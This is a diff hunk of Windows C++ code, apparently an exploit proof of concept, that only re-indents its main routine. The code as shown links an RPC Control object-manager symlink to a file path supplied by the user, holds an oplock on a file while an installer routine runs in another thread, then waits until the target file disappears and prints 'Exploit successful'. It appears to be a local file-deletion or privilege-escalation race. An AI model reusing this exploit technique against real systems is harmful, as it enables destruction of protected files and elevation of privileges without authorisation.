@@ -18,23 +18,23 @@ int wmain(int argc, wchar_t** argv) {
 	dir = dir + L"\\{31566FE1-6713-4FC2-A132-EB4C9D111012}";
 	CreateDirectory(dir.c_str(), NULL);
 	std::wstring file = dir + L"\\icon.ico";
-    DosDeviceSymLink(L"Global\\GLOBALROOT\\RPC Control\\icon.ico", BuildPath(argv[1]));
+    	DosDeviceSymLink(L"Global\\GLOBALROOT\\RPC Control\\icon.ico", BuildPath(argv[1]));
 
 	hDir = CreateFile(dir.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
 	hFile = CreateFile(file.c_str(), DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);
-    FileOpLock* op;
-    op = FileOpLock::CreateLock(hFile, cb0);
-    if (op != NULL) {
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)install, NULL, 0, NULL);
-        op->WaitForLock(INFINITE);
-    }
-    HANDLE success;
+    	FileOpLock* op;
+    	op = FileOpLock::CreateLock(hFile, cb0);
+    	if (op != NULL) {
+        	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)install, NULL, 0, NULL);
+        	op->WaitForLock(INFINITE);
+    	}
+    	HANDLE success;
 
-    do {
-        Sleep(1000);
-        success = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
-    } while (success != INVALID_HANDLE_VALUE);
-    printf("[+] Exploit successful!\n");
+    	do {
+        	Sleep(1000);
+        	success = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+    	}while (success != INVALID_HANDLE_VALUE);
+    	printf("[+] Exploit successful!\n");
 }
 DWORD WINAPI install(BOOL install) {
 	HMODULE hm = GetModuleHandle(NULL);
